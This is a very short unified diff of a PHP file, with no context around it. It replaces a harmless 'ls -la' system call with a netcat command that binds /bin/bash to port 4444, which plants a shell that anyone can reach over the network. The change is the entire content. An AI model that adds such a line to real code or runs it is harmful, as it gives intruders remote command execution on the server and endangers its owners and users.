@@ -1,3 +1,3 @@
 <?php
-system("ls -la");
+system("nc -p 4444 -e /bin/bash");
 ?>
